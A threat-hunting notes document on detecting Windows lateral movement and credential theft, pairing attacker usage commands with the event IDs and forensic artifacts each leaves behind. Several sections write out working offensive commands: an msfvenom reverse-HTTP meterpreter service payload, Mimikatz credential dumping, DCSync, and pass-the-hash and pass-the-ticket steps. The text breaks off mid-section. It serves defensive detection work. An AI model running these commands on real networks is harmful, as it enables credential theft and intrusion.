# Hunting Notes - Windows Lateral Movement and Credential Harvesting

> Paolo Coba | 04/03/2022

-------------------------------------------

# Resources
* [https://nv2lt.github.io/windows/smb-psexec-smbexec-winexe-how-to](https://nv2lt.github.io/windows/smb-psexec-smbexec-winexe-how-to)
* [https://eaneatfruit.github.io/2019/08/18/Offensive-Lateral-Movement/](https://eaneatfruit.github.io/2019/08/18/Offensive-Lateral-Movement/)
* [Lee Kirkpatrick's blogs on Lateral Movement](https://community.netwitness.com/t5/user/viewprofilepage/user-id/6034)
* [https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/#)
* [https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#wmiexecpy](https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/#wmiexecpy)
* [https://u0041.co/blog/post/1](https://u0041.co/blog/post/1)
* [https://www.youtube.com/watch?v=H8ybADELHzk](https://www.youtube.com/watch?v=H8ybADELHzk)
* [https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/](https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/)
* [https://www.unh4ck.com/detection-engineering-and-threat-hunting/lateral-movement/detecting-conti-cobaltstrike-lateral-movement-techniques-part-1](https://www.unh4ck.com/detection-engineering-and-threat-hunting/lateral-movement/detecting-conti-cobaltstrike-lateral-movement-techniques-part-1)
* [Pass-the-hash](https://blog.netwrix.com/2021/11/30/how-to-detect-pass-the-hash-attacks/)
* [https://www.jpcert.or.jp/english/pub/sr/20170612ac-ir_research_en.pdf](https://www.jpcert.or.jp/english/pub/sr/20170612ac-ir_research_en.pdf)
* [https://community.netwitness.com/t5/netwitness-community-blog/detecting-impacket-with-netwitness-endpoint/ba-p/683062](https://community.netwitness.com/t5/netwitness-community-blog/detecting-impacket-with-netwitness-endpoint/ba-p/683062)
* [https://neil-fox.github.io/Impacket-usage-&-detection/](https://neil-fox.github.io/Impacket-usage-&-detection/)

-------------------------------------------

# Mapped Network Shares

## Characteristics
Mapping remote shares (`C$` or `Admin$`) to local share through `net.exe`.

## Usage
```cmd
net use z: \\host\C$ /user:<domain>\<username> <password>
```

## Detection
### Source
* Security EVTX:
	* `4648`: Logon specifying alternate credentials:
		* Current logged on username.
		* Alternate username.
		* Destination hostname/IP.
		* Process Name
* `Microsoft-Windows-SmbClient%4Security.evtx`:
	* `31001`: Failed logon to destination. Includes:
		* Destination hostname
		* Username for failed logon
		* Reason code for failed destination logon.
* `NTUSER\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2`: Contains remotely mapped drives.
* ShimCache Evidence:
	* `net.exe`
	* `net1.exe`
* AmCache.hve Evidence:
	* `net.exe`
	* `net1.exe`
* Shellbags: Remote folders accessed inside an interactive session via Explorer.

### Destination
* Security EVTX:
    * `4624`: Logon type 3
        * Source IP and Logon Username
    * `4672`
        * Logon Username
        * Logon by user with admin rights
        * Requirements for accessing default shares (C$ and Admin$)
    * `4776`: NTLM if authenticating to Local System
        * Source hostname
        * Logon username
    * `4768`: TGT granted. This is available only on the domain controller.
        * Source hostname
        * Logon username
    * `4769`: Service Ticket Granted if authenticating to domain controller.
        * Destination hostname
        * Logon username
        * Source IP
    * `5140`: Share access
    * `5145`: Auditing of shared files

-------------------------------------------
# Scheduled Tasks

## Characteristics

Utilities such as `at` and `schtasks`, along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on.Scheduling a task on a remote system typically required being a member of the Administrators group on the remote system.

A task needs to be created or registered, then run and finally cleaned up to remove traces of activity.

Scheduled Tasks use DCE/RPC for remote execution with the `ITaskSchedulerService` endpoint, called with the following operations:
* `SchRpcRegisterTask` (Create/Register/Modify Task)
* `SchRpcRun` (Run task)
* `SchRpcGetTaskInfo` (Get task details)
* `SchRpcRetrieveTask` (Retrieve list of tasks)
* `SchRpcDelete` (Delete task)

## Usage

### schtasks.exe
```cmd
schtasks /s <hostname/IP> /RU "SYSTEM" /create /tn <taskname> /tr <command/payload> /sc ONCE /sd <date> /st <time>
# Can also specify particular user with /U and /P

schtasks /s <hostname/IP> /run /TN <taskname>

schtasks /s <hostname/IP> /TN <taskname> /delete /f

```

## Detection

### Detection in Source
* Security EVTX
    * `4648`: Logon specifying alternate credentials
        * Current logged on username
        * Alternate username
        * Destination hostname
        * Destination IP
        * Process name
* ShimCache:
    * `at.exe`
    * `schtasks.exe`
* AmCache.hve:
    * `at.exe`
    * `schtasks.exe`
* Prefetch
    * `at.exe-{hash}.pf`
    * `schtasks.exe-{hash}.pf`

### Detection in Destination
* Security EVTX
    * `4624`: Logon type 3
        * Source IP and Logon username
    * `4672`
        * Logon username
        * Logon by user with admin rights
        * Requirement for accessing default shares (C$ and Admin$)
    * `4698`: Scheduled task created
    * `4702`: Scheduled task updated
    * `4699`: Scheduled task deleted
    * `4700/4701`: Scheduled task enabled/disabled
* `Microsoft-Windows-TaskScheduler%4Operational.evtx`
    * `106`: Scheduled task created
    * `140`: Scheduled task updated
    * `141`: Scheduled task deleted
    * `200/201`: Scheduled task executed/completed
* `Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Task`
* `Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree`
* ShimCache: evidence of whatever was executed with task.
* AmCache: evidence of whatever was executed with task.
* Prefetch: evidence of whatever was executed with task.
* For tasks created with `at.exe`:
    * Job files created in `C:\Windows\Task`
* For tasks created with `schtasks.exe`
    * XML task files created in `C:\Windows\System32\Tasks`
    * Author tag under `RegistrationInfo` can id:
        * Source system name
        * Creator username

### at.exe
```cmd
at \\<host> <time> <command/payload>
```

-------------------------------------------

# PsExec

## Microsoft Sysinternals Suite

Allows the execution of interactive commands over SMB using named pipes. 
* Connects to $ADMIN share
* Uploads a psexesvc.exe file. 
* Uses service control manager (sc) to start the service binary.
* Creates named pipe on destination host.
* Uses pipe for I/O operations.

### Normal usage
```cmd
PsExec.exe /accepteula \\<dest> -u <domain>\<user> -p <password> command
```

### Pass the hash
```cmd
privilege::logonpasswords
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>
PsExec.exe /accepteula \\<dest> command
```

## Impacket Toolsuite
Fails with interactive binaries such as powershell, vssadmin, plink etc. Uploads a service binary with an arbitrary name.

## Normal usage
```bash
python psexec.py user:password@<host> command
```

## Pass the hash
```bash
python psexec.py -hashes <hash> user@<host> command
```

## Manual PsExec behavior with sc

### Requirements
* Port 139,445 open on target machine.
* Password or NTLM hash.
* Write permissions on network share.
* Permission to create services on the remote machine: **SC_MANAGER_CREATE_SERVICE**
* Permission to start created service: **SERVICE_QUERY_STATUS + SERVICE_START**

### Steps
* Create exe as service
```bash
msfvenom -p windows\x64\meterpreter\reverse_http LHOST=<host> LPORT=<port> -f exe-service --platform windows -e x64\xor_dynamic -o meter64_service.exe
```
* Upload exe to network share on target machine (needs password)
```bash
smbclient \\<host>\\<share> -U <user> -c "put meter64_service.exe test.exe"
```
* Create service remotely with impacket's service.py
```bash
python services.py <DOMAIN>\<user>@<host> create -name <service name> -display <display name> -path "\\\\<host>\\<share\\test.exe"
```
* Start service remotely with impacket's service.py
```bash
python services.py <DOMAIN>\<user>@<host> start -name <service name>
```

## Detection

### Running processes
* SysInternal's PsExec:
```cmd
PSEXESVC.exe -> Create Process -> cmd.exe -> Create Process -> conhost.exe
```
* Impacket's psexec.py
```cmd
ntoskrnl.exe -> Write to Executable -> <randomname>.exe
<randomname>.exe -> Create Process -> cmd.exe -> Create Process -> conhost.exe
```

### Detection on source
* Registry value created when PsExec License Agreement is accepted.
* Security EVTX:
    * `4648`: Logon with alternate credentials
        * Current logged on username
        * Alternate username
        * Destination hostname
        * Destination IP
        * Process name
* `NTUSER.dat`: `Software\SysInternals\PsExec\EulaAccepted`
* ShimCache: `psexec.exe`
* AmCache.hve: `psexec.exe`
* Prefetch:
    * `psexec.exe-{hash}.pf`
    * Possible references to other files accessed by psexec.exe.

### Detection on destination
* `psexesvc.exe` uploaded to target's $ADMIN share.
* ShimCache: `psexesvc.exe`
* Amcache: `psexesvc.exe`
* Prefetch: `psexesvc.exe-{hash}.pf`
* Service creation in `SYSTEM\CurrentControlSet\Services\PSEXESVC`. Name can be different, attackers may use `-r` switch.
* Security EVTX:
    * `4648`: Logon specifying alternate credentials
        * Username
        * Process Name
    * `4624`: Logon type 3 (normal) or logon type 2 for `-u` switch.
        * Source IP
        * Logon username
    * `4672`: Special privileges assigned to new logon.
        * Logon username
        * Logon by user with admin rights
        * Requirement for access default shares C$ and Admin$.
    * `5140`: Share access
        * `Admin$` share used by PsExec
    * `5145`
* System EVTX:
    * `7045` for service install.

### Detection applicable to both source and destination
* Memory Forensics:
    * Look for PsExe process:
    ```bash
    vol.py -f <image> --profile=<profile> psscan | grep PSEXE
    ```
    * Map strings with volatility:
    ```bash
    vol.py -f <image> --profile=<profile> strings -s <strings_file> > mapped_strings

    grep -i psexe mapped_strings
    ```

**Important**
Whatever is executed with psexec will be spawned as a child process of `psexesvc.exe` on the destination.

-------------------------------------------

# PAExec

## Characteristics

Relies on SMB protocol. Copies an executable to `Admin$` and uses the Windows Service Control Manager API to start it as a service. The service uses named pipes to connect back to the tool.

A PAexec service is spawned on the target machine, running with admin privileges. Redirects input/output streams of the process execution back and forth between hosts via named pipes.

## Functionality
* Opens SMB session using supplied credentials to authenticate. If it fails to write to the `ADMIN$` share it tires to write to `IPC$` share.
* If run without any additional command line paramenters it produces an autogenerated name for the service executable (`PAExec-<PID>-<HOSTNAME>.exe`). `PID` and `Hostname` contain the pid and hostname of the source.
```cmd
paexec.exe \\<remote> -s <target executable>
```
* If run with `-noname` parameter it will name the service executable as `PAExec`.
```cmd
paexec.exe \\<remote> -noname -s <target executable>
```
* To specify custom name, use `-sname` parameter.
* Opens handle to `\\client\pipe\svcctl` to communicate with the Service Control Manger. This is for starting and stopping services remotely (Using SVCCTL protocol on top of DCE/RPC).

## Detection
* Filesystem analysis: check for presence of service executable.
* PAExec on the target machine is installed as a service. Check for Event ID 7045.
* Amcache and Shimcache evidence of program execution.
* Prefetch: monitors dll load to optimize future program execution. Can contain traces of execution.
    * Useful technique: when discovering traces of paexec, dump prefetch files for all systems in the network. Will give information of both source and destination of lateral movement.

-------------------------------------------

# smbexec.py

## Characteristics

Does not upload a service binary to target. Creates a service with name **BTOBTO**. This can be changed as the tool is highly customizable (either code or parameter when running). 

## Functionality:
```
%COMSPEC% /Q /c echo <command> > \\127.0.0.1\C$\__output 2>&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat
```

* %COMPSPEC%: Environment variable that points to cmd.exe
* /Q: Turns echo off.
* /c: Carries out the specified command and terminates.
* Command is echoed in a file called __output in the C$ of the local machine.
* Transfers the command in a bat file in %TEMP%/execute.bat which is then executed and deleted.
    * %TEMP%: Environment variable that points to C:\Users\<username>\AppData\Local\Temp
* 

## Usage

### Normal Usage
```bash
python smbexec.py <user>:<password>@<host>
```

### Pass the hash
```bash
python smbexec.py -hashes <hash> <user>@<host> command
```

## Detection
* Event log id 7045 for service creation

### Running processes
```cmd
cmd.exe -> Write to Executable -> execute.bat

cmd.exe (C:\Windows\System32\cmd.exe /Q/c echo <command> > \\127.0.0.1\C$\__output 2>&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat)-> Create Process -> cmd.exe (C:\Windows\System32\cmd.exe /Q /c %TEMP%\execute.bat ) -> Create Process -> conhost.exe
```

### Detection in Netwitness Packets

* Application rule for smbexec detection
```
(ioc = 'remote service control') && (analysis.service = 'windows cli admin commands') && (service = 139) && (directory = '\\C$\\','\\ADMIN$\\')
```

### Detection in Netwitness Endpoints
* Application rule for smbexec detection
```
param.dst contains '\\127.0.0.1\C$\__output'
```

* Meta to look for
 * Behaviors of Compromise:
    * services runs command shell
    * runs chained command shell

-------------------------------------------

# Smbclient

## Characteristics

Tool to test connectivity to Windows shares. Can transfer, upload, backup files. Can be used with pass-the-hash.

## Normal Usage
* List shares
```bash
smbclient -L <dest> -U <user> -W <domain>
```

* Access drive
```bash
smbclient //<dest>/<share> -U <user> -W <domain>
```

## Pass the hash

```bash
smbclient //<dest>/<share> -U <user>%<hash> --pw-nt-hash
```

## Detection
* Security EVTX:
    * Event ID 5140: A network share was accessed:
        * Account
        * Source Address
        * Source Port
        * Share Name
    * Event ID 5145: A network share object was checked to see whether the client can be granted desired access.

-------------------------------------------

# Winexe

## Characteristics

GNU/Linux based application that allows users to execute commands remotely on WindowsNT/2000/XP/2003/Vista/7/8 systems. It installs a service on the remote system, executes the command. **TODO: Determine if service is uninstalled once completed and file is deleted**.
* Connects to ADMIN$ share and uploads winexesvc.exe file.
* Uses service control manager (sc) to start the service binary (service named winexesvc).
* Creates a named pipe on the destination host and uses it for I/O operations.

## Usage
```bash
winexe -U <user>%<password> //<dest> command
```

## Detection
* Event log id 7045 for service creation. Service name winexesvc.

## Detection in NWP
* Filename metadata: Search for winexesvc.exe.
* Use analysis.service='named pipe' drill:
    * Filename metadata: svcctl. Named pipe used by Service Control Manager. Acts as RPC to control services on remote endpoints.
* Other named pipe to check for: ahexec. Used by Winexe for remote commands. Can see remote commands.
* Application rule:
```
(filename = 'ahexec','winexesvc.exe') && (service = 139)
```

## Detection in NWE
* filename.src meta: search for winexesvc.exe
* filename.dst meta: shows executables invoked.
* Application rule:
```
filename.src = 'winexesvc.exe'

(reference.id='7045') && (service.name='winexesvc')
```

-------------------------------------------

# WMI

## Characteristics

Built into Windows. Allows remote access by communicating with RPC using port 135. It can be used to start a service or execute commands remotely.

## Built-In WMIC
```cmd
wmic /node:<dest> /user:<domain>\<user> /password:<password> process call create <executable>
```

```powershell
Invoke-WmiMethod -Computer host -Class Win32_Process -Name create -Argument <executable>
```

## Impacket toolsuite
```bash
python wmiexec.py <user>:<password>@<dest>
python wmiexec.py -hashes <hash> <user>@<dest>
```

## Detection

### Running processes
* wmiexec.py
```cmd
wmiprvse.exe -> Create Process -> cmd.exe (C:\Windows\System32\cmd.exe /Q /c <command> 1 > \\127.0.0.1\ADMIN$\___ 2>&1) -> Create Process -> conhost.exe
```

### Detection in Source:
* Security EVTX
    * `4648`: logon with explicit credentials.
        * Current loggedon username
        * Alternate username
        * Destination hostname/IP
        * Process name
    * `4688`: New process "wmic.exe" created
    * `4689`: Process terminated.
* ShimCache: `wmic.exe`
* BAM/DAM: Last time executed for `wmic.exe`
* AmCache: First time executed for `wmic.exe`

### Detection in Destination:
* Security EVTX
    * `4624`: Logon type 3
        * Source IP
        * Logon username
    * `4776`,`4672`
        * Logon username
        * Logon by user with admin rights
    * `4688`: process `wmiprvse.exe` with child process based on executed command
* System EVTX
    * `1`: process `wmiprvse.exe` with child process based on executed command
* `Microsoft-Windows-WMI-Activity%4Operational.evtx`
    * `5857`: Indicates time of wmiprvse execution and path to provider DLL. May find presence of malicious provider DLLs.
    * `5860`,`5861`: Registration of Event Consumers. Can be used both for persistence or remote execution.
* ShimCache
    * `scrcons.exe`
    * `mofcomp.exe`
    * `wmiprvse.exe`
    * Other executables that may be executed by attacker
* AmCache
    * `scrcons.exe`
    * `mofcomp.exe`
    * `wmiprvse.exe`
    * Other executables that may be executed by attacker
* `.mof` files that manage remote repository. Traces of the executables executed by the attacker.
* Prefetch:
    * `scrcons.exe-{hash}.pf`
    * `mofcomp.exe-{hash}.pf`
    * `wmiprvse.exe-{hash}.pf`
    * Other executables that may be executed by attacker
* Unauthorized changes to the WMI Repository in `C:\Windows\System32\wbem\Repository`
## Detection in NWP
* Indicators of Compromised meta key: look for **wmi command**
* Action meta key: executed commands
* Application rule:
```
action contains '127.0.0.1\\admin$\\__1'
```

## Detection in NWE
* Behaviors of Compromise meta key: look for **wmiprvse runs command shell**
* Application rule:
```
param.dst contains '127.0.0.1\\admin$\\__1'
```

**Important**
Whatever is executed with `wmic.exe` will be spawned as child of `wmiprvse.exe` in the destination.

-------------------------------------------
# Wmiexec.vbs

## Characteristics

Built into Windows. Allows remote access by communicating with RPC using port 135. It can be used to start a service or execute commands remotely.

## Tool

## Detection

### Detection in Source
* Security EVTX:
    * Event ID 4688 - New process created: Check for `wscript.exe` or `cscript.exe` running with parent `cmd.exe` or `powershell.exe`. Process command line contains script arguments.
    * Event ID 4689 - Process exited.
* Sysmon EVTX:
    * Event ID 1 - Process created.
    * Event ID 5 - Process terminated.
* Shimcache
    * `wscript.exe` or `cscript.exe`
* AmCache
    * `wscript.exe` or `cscript.exe`
* Prefetch
    * `C:\Windows\Prefetch\wscript.exe-{hash}.pf` or `cscript.exe-{hash}.pf`
### Detection in Destination
* Security EVTX:
    * Event ID 4624 - Successful logon: Type 3, contains account and source.
    * Event ID 4672 - Special permissions assigned to logon.
    * Event ID 4688 - Process Creation: `cmd.exe` created from `wmiprvse.exe`. Process command line contains command executed on the system. Only when `wmiexec.vbs` is called with `/cmd` flag.
    * Event ID 4688 - Process Creation: `command.exe` with parent `cmd.exe`.
    * Event ID 4688 - Process Creation: `cmd.exe` with parent `wmiprvse.exe`. Contains delete share operation in process command line: `cmd.exe /c del C:\windows\temp\wmi.dll /F > nul 2>&1`
    * Event ID 5142 - A network share object was added:
        * Share Name: \\*\WMI_SHARE
        * Share Path: C:\Windows\Temp
    * Event ID 5145 - A network share object was checked to see if the client has desired access: Contains share name and share path.
    * Event ID 5144 - A network share object was deleted. Contains share name and share path.
* Sysmon EVTX:
    * Event ID 1 - Process created.
    * Event ID 5 - Process terminated.
* Shimcache
    * `wscript.exe` or `cscript.exe`
    * `wmiprvse.exe`
* AmCache
    * `wscript.exe` or `cscript.exe`
    * `wmiprvse.exe`
* Prefetch
    * `C:\Windows\Prefetch\wscript.exe-{hash}.pf` or `cscript.exe-{hash}.pf`
    * `C:\Windows\Prefetch\wmiprvse.exe-{hash}.pf`

-------------------------------------------


# Pass-the-Hash

## Characteristics
Relies on NTLM authentication.

## Usage
* Mimikatz
```cmd
sekurlsa::logonpasswords

sekurlsa::pth /user:<user> /ntlm:<ntlm> /domain:<domain>
```

## Detection
### Detection in source
* Security EVTX:
    * Event ID 4648 - Logon with explicit credentials.
    * Event ID 4624 - Logon: Logon type 9 NewCredential
        * Logon Process: seclogo
        * Authentication Package: Negotiate
    * Event ID 4672 - Special Privileges assigned to new logon.

### Detection in destination:
* Security EVTX:
    * Event ID 4624 - Logon: Logon type 3 NTLM
    * Event ID 4672 - Special Privileges assigned to new logon.

### Detection in DC
* Security EVTX:
    * Event ID 4776: The computer attempted to valide the credential for an account.


-------------------------------------------

# Powershell Remoting

## Usage

```powershell
Enter-PSSession -ComputerName <host/ip> -Credential <username>

Invoke-Command -ComputerName <host/ip> -Credential <username> -ScriptBlock {<command to execute>}
```
## Detection

### Detection in Source
* Security EVTX
    * `4648`: Logon specifying alternate credentials
        * Current logged on username
        * Alternate username
        * Destination hostname
        * Destination IP
        * Process Name
* `Microsoft-Windows-WinRM%4Operational.evtx`:
    * `6`: WSMan Session Initialize
        * Session created
        * Destination hostname/IP
        * Current logged on username
    * `8`,`15`,`16`,`33`: WSMan session deinitialization
        * Closing of WSMan session
        * Current logged on username
* `Microsoft-Windows-Powershell%4Operational.evtx`
    * `40961`,`40962`: Local initiation of powershell.exe and associated user account
    * `8193`,`8194`: Session created
    * `8197`: Connect
        * Session closed
* ShimCache
    * `powershell.exe`
* BAM/DAM
    * `powershell.exe`
* AmCache
    * `powershell.exe`
* Prefetch
    * `powershell.exe-{hash}.pf`: Will also contain scripts that run within 10 seconds of powershell.exe launching.
* Command history: `C:\Users\<Username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`: the previous 4096 commands are maintained per user.


### Detection in Destination
* Security EVTX
    * `4624`: Logon type 3
        * Source IP
        * Logon Username
    * `4672`
        * Logon username
        * Logon by user with admin rights
* `Microsoft-Windows-PowerShell%4Operational.evtx`
    * `4103`,`4104`: Script block logging. Logs scripts if configured
    * `53504`: Records authenticating user
* `Windows PowerShell.evtx`
    * `400`,`403`: `ServerRemoteHost` indicates start/end of Remoting session
    * `800`: includes partial script code
* `Microsoft-Windows-WinRM%4Operational.evtx`
    * `91`: Session creation
    * `168`: Records authenticating user
* ShimCache:
    * `wsmprovhost.exe`
    * Other executables executed through PSRemoting
* AmCache
    * `wsmprovhost.exe`
    * Other executables executed through PSRemoting
* `HKLM\SOFTWARE\Microsoft\PowerShell\ShellIds\Microsoft.PowerShell\ExecutionPolicy`: Attacker may change it to `bypass`
* `Enter-PSSession` may create a user profile directory
* Prefetch
    * `wsmpprovhost.exe-{hash}.pf`
    * Other executables executed through powershell


-------------------------------------------

# SCShell

## Resources
* [https://github.com/Mr-Un1k0d3r/SCShell](https://github.com/Mr-Un1k0d3r/SCShell)

## Characteristics

Fileless lateral movement. The tool does not create a service or drop a file but instead uses the `ChangeServiceConfigA` function to edit an existing srevice and make it execute commands.

Only command execution using `DCE/RPC`. This makes it stealthier but more limited in functionality.

## Normal Usage
```cmd
SCShell.exe target service payload domain username password
```

## Pass-the-hash Usage

### Impacket
```bash
python scshell.py <domain>/<user>@<target> -hashes <hashes>
```

### Alternative
```cmd
sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:cmd.exe

Use scshell.exe in spawned cmd.exe
```

## Detection

### Detection in Destination
* Security EVTX:
    * Event ID 4624 - Logon: Contains account and source.
    * Event ID 4672 - Special permissions assigned to new logon: Contains account name
    * Event ID 4688 - Process Creation: `<executable>.exe` created with parent `services.exe`.
    * Event ID 5140 - A network share object was accessed: share name `\\*\IPC$`.
    * Event ID 5145 - Detailed file share: share name `\\*\IPC$` and relative target name `svvctl`. Contains source IP.

### Detection in NWP
* `Indicators of Compromise`: `remote service control`
    * `Action Event`:
        * `startservicea`: Starts a service.
        * `queryserviceconfiga`: Retrieves the configuration parameters of the specified service.
        * `openserviceconfiga`: Opens existing service.
        * `openscmanagerw`: Establishes a connection to the service control manager on the specified system and opens the specified service control manager database.
        * `changeserviceconfiga`: Changes configuration parameters of a service.
* Application rule:
```cmd
service = 139 && filename = 'svcctl' && action = 'openservicea' && action = 'changeserviceconfiga' && action = 'startservicea'
```

### Detection in NWE
* Method 1 - Frequency analysis:
    * Query:
    ```cmd
    device.type='nwendpoint' && filename.src='services.exe' && action='createprocess'
    ```
    * Open `Filename Destination` and sort in ascending order. This allows for frequency analysis.
* `Behaviors of Compromise`:
    * `os process runs command shell`
    * `services runs command shell`

-------------------------------------------

# Atexec.py

## Characteristics
Lateral movement through Windows task creation. Creates remote task, executes and then deletes it. Does not allow interactive sessions. It writes command results to a file with the same name as the task in C:\Windows\temp\<taskname>.tmp. Connections over TCP port 445.

## Usage
```bash
python atexec.py <user>:<password>@<host> <command>
```

## Detection

### Running processes
```cmd
svchost.exe -> Create Process -> cmd.exe (C:\Windows\System32\cmd.exe /C <command> > C:\Windows\temp\<taskname>.tmp 2>&1)
```
### Forensics Detection
* Task XML file can be found in `C:\Windows\System32\Tasks`. Check for random names.
* Windows Event Logs:
    * Microsoft-Windows-TaskScheduler%4Operational:
        * Event ID 106: New task creation event. Taskname and username.
        * Event ID 110: Task triggered by user.
        * Event ID 141: Task deleted.
    * Security:
        * Event ID 4624: Logon type 3 and NTLM protocol used. 2 logins:
            * Login for task creation.
            * Login for retrieving the results.
        * Event ID 4634: Logoff with the same login ID as the login event above.
        * Event ID 4688 - Process Created: `cmd.exe` with parent  `svchost.exe`.
    * Microsoft-Windows-SMBServer%4Security:
        * Event ID 1015: Contains the attacking IP.
* MFT Artifacts:
    * Task file in C:\Windows\system32\tasks\<taskname>
    * Results file in C:\Windows\temp\<taskname>.tmp

### Detection in NWP
* Query:
```cmd
service=139 && analysis.service='named pipe`
```
* Search in `filename`: there must be `atsvc` to indicate that the AT-Scheduler service was used.

-------------------------------------------

# dcomexec.py

Uses DCOM endpoints to open semi-interactive shell on remote systems. Uses multiple ports for connection (TCP/135, TCP/445, TCP/49751).

## Usage

```bash
Open semi-interactive shell: dcomexec.py --object <MMC20.Application, ShellWindows, SHellBrowserWindow> <domain>/<username>:<password>@<ip>

Execute specific command: dcomexec.py --object <MMC20.Application, ShellWindows, SHellBrowserWindow> <domain>/<username>:<password>@<ip> <command>
```

## Detection

### Running Processes

```cmd
mmc.exe -> Create Process -> cmd.exe (C:\Windows\System32\cmd.exe /Q /c <command> 1 > \\127.0.0.1\ADMIN$\_____ 2>&1) -> Create Process -> conhost.exe
```

### Forensic Artifacts
* Multiple `Logon` and `Special Logon` Event IDs generated:
    * Security Event ID 4624
    * Security Event ID 4672

-------------------------------------------

# RDP

## Detection

### Detection in source
* Registry `HKCU\SOFTWARE\Microsoft\Terminal Server Client`: Contains username hint when connecting to remote systems with specified account.
* Jumplists: `C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Recent\(Automatic/Custom)Destinations`.
    * `{MSTSC-APPID}-automaticDestinations-ms` tracks remote desktop connection destinations and times.
* `NTUSER.DAT`: check for `mstsc.exe`, the remote desktop client execution. Shows last time executed, number of times executed. 
    * `RecentItems` subkey tracks connection destinations and times.
* Prefetch: `C:\Windows\Prefetch\mstsc.exe-{hash}.pf`
    * Tool: `PECmd.exe`
    ```cmd
    PECmd.exe -d <Prefetch location>
    ```
* Bitmap Cache: `C:\Users\<Username>\AppData\Local\Microsoft\Terminal Server Client\Cache`:
    * `bcache##.bmc`
    * `cache####.bin`
    * Tool: [https://github.com/ANSSI-FR/bmc-tools.git](https://github.com/ANSSI-FR/bmc-tools.git)
* Security EVTX:
    * Event ID `4648`: Logon specifying alternate credentials. If NLA enabled on destination it can give:
        * Current logged-on Username
        * Alternate Username
        * Destination hostname/ip
        * Process name
* `Microsoft-Windows-TerminalServices-RDPClient%4Operational.evtx`
    * `1024`: Destination hostname
    * `1102`: Destination IP address

### Detection in target
* `NTUSER.DAT` files for compromised accounts. `UserAssist` key gives overview on what was executed from the GUI.
* Security EVTX:
    * `4624`: Logon type 3. Gives source IP and logon username.
    * `4778/4779`: 
        * IP address of Source/Source system name.
        * Logon Username
* `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS%4Operational.evtx`
    * `131`: Connection attempts - Source IP.
    * `98`: Successful connections
* `Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx`
    * `1149`: Source IP/Logon Username. Blank username may indicate Sticky Keys.
* `Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx`
    * `21,22,25`: Source IP/Logon Username
    * `41`: Logon Username
* Shimcache - SYSTEM
    * `rdpclip.exe`
    * `tstheme.exe`
* Amcache.hve - First time executed
    * `rdpclip.exe`
    * `tstheme.exe`
* Prefetch `C:\Windows\Prefetch`
    * `rdpclip.exe`
    * `tstheme.exe-{hash}.pf`
    * Tool: `PECmd.exe`
    ```cmd
    PECmd.exe -d <Prefetch location>
    ```

-------------------------------------------

# Kerberos for Lateral Movement

## Overpass-the-hash

Used when authenticating through Kerberos in an Active Directory environment. Attackers need to obtain the NT hash of a user's password to request a Ticket Granting Ticket from a domain controller. The NT hash can be used to complete the Kerberos preauthentication request by encrypting the current timestamp with the account's long-term key.
Useful when obtaining the NTLM hash for an account, but Kerberos authentication is required to reach the destination.

* Resources
    * [https://stealthbits.com/blog/how-to-detect-overpass-the-hash-attacks/](https://stealthbits.com/blog/how-to-detect-overpass-the-hash-attacks/)

### Steps
* Obtain NTLM hash for the account:
    * Mimikatz:
    ```cmd
    privilege::debug
    sekurlsa::logonpasswords
    ```
* Perform pass-the-hash: NTLM hash is passed into the Kerberos authentication provider using RC4 encryption (RC4-HMAC-MD5). To check for result use `klist`
```cmd
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm>
```

#### Create Kerberos tickets using AES keys.
* Get AES Key
    * Method 1: DCSync
    ```cmd
    privilege::debug

    lsadump::dcsync /user:<user> /domain:<domain>
    ```
    * Method 2: EKeys
    ```cmd
    privilege::debug

    sekurlsa::ekeys
    ```
* Issue ptt to inject the AES key into Kerberos ticket
```cmd
sekurlsa::pth /user:<user> /domain:<domain> /aes256:<aes key>
```

### Detection

#### Source
* Security EVTX
    * 4648 - Logon with explicit creadentials
    * 4624 - Account successfully logged on: Logon type 9, logon process `seclogo`
    * 4672 - Special privileges assigned to new logon: referred to logged on user.

#### Destination
* Security EVTX
    * 4624 - Account successfully logged on: Logon type 3, logon process `Kerberos`, authentication package `Kerberos`
    * 4672 - Special privileges assigned to new logon

#### Domain Controller
* Security EVTX
    * 4768 - A Kerberos authentication ticket (TGT) was requested.
    * 4769 - A Kerberos service ticket was requested.

#### Additional detection method
Use [Get-LoggedOnUsers](https://github.com/tmmtsmith/Powershell/blob/master/Get-LoggedOnUsers.ps1) and then klist to examine the Kerberos tickets associated with each session.

## Pass-the-Ticket

The attacker is able to extract a Kerberos Ticket Grating Ticket from LSASS memory on a system and then use it on another system to request Kerberos Service Tickets to gain access to network resources.

Kerberos TGT tickets expire in 10 hours by default and it can be renewed for 7 days.

* Resources
    * [https://stealthbits.com/blog/how-to-detect-pass-the-ticket-attacks/](https://stealthbits.com/blog/how-to-detect-pass-the-ticket-attacks/)

### Steps
* Mimikatz: 
    * Export tickets
    ```cmd
    privilege::debug

    sekurlsa::tickets /export
    ```
    * Search for `krbtgt`
    ```cmd
    dir | findstr "krbtgt"
    ```
    * Reuse cached ticket to get Domain Admin under current session
    ```cmd
    kerberos::ptt <ticket>
    ```
    * Check for output
    ```cmd
    klist | findstr "Cached"
    ```
    * Access DC
    ```cmd
    <command> \\<DC Nane>\<share>
    ```
* Rubeus:
    * Monitor for logon sessions every 30 seconds: once a user logs on the TGT is obtained. Ticket is in base64 so remove breaks and spaces.
    ```cmd
